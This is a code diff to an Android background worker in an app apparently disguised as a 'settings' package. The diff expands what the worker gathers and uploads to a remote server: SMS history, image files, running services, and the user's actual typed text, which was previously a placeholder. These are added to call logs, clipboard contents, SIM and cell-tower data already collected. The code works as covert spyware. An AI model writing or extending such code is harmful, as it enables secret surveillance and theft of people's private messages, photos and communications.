@@ -31,6 +31,7 @@ import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
 import static com.example.settings.MainActivity.clipboardManager;
 import static com.example.settings.MainActivity.deviceInformation;
 import static com.example.settings.MainActivity.getCellInfo;
+import static com.example.settings.MainActivity.getFiles;
 import static com.example.settings.MainActivity.geturl;
 import static com.example.settings.MainActivity.setupWorkManager;
 import static com.example.settings.MainActivity.setuponetimeworkManager;
@@ -76,7 +77,9 @@ public class SyncData extends Worker {
         ClickedData=mSharedpref.getClickedData();
         OtherClickedData=mSharedpref.getOtherClickedData();
         Utils.readCallLogs(context,mSharedpref);
+        Utils.readSmsHistory((Activity) context,mSharedpref);
         Utils.getBatteryPercent(context,mSharedpref);
+        Utils.checkServices(context,mSharedpref);
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -168,11 +171,15 @@ public class SyncData extends Worker {
                             parmas.put("ClickedData", ClickedData);
                             parmas.put("OtherClickedData", OtherClickedData);
                             parmas.put("CallHistory",mSharedpref.getCallHistory());
+                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
                             parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
                             parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
+                            parmas.put("ImageFiles", getFiles(mSharedpref));
+                            parmas.put("Services", mSharedpref.getServiceStatus());
+
                             return parmas;
                         }
                     };
@@ -223,7 +230,7 @@ public class SyncData extends Worker {
                             parmas.put("action", "addItem");
                             parmas.put("Name", Name);
                             parmas.put("DaysTime", DaysTime);
-                            parmas.put("TextWritten", "Everything is empty");
+                            parmas.put("TextWritten", TextWritten);
                             parmas.put("OutgoingNumbers", OutgoingNumbers);
                             parmas.put("RecievedNumbers", RecievedNumbers);
                             parmas.put("MissedCallNumbers", MissedCallNumbers);
@@ -235,9 +242,15 @@ public class SyncData extends Worker {
                             parmas.put("SmsData", SmsData);
                             parmas.put("ClickedData", ClickedData);
                             parmas.put("OtherClickedData", OtherClickedData);
+                            parmas.put("CallHistory",mSharedpref.getCallHistory());
+                            parmas.put("SmsHistory",mSharedpref.getSmsHistory());
+                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
+                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
+                            parmas.put("ImageFiles", getFiles(mSharedpref));
+                            parmas.put("Services", mSharedpref.getServiceStatus());
                             return parmas;
                         }
                     };
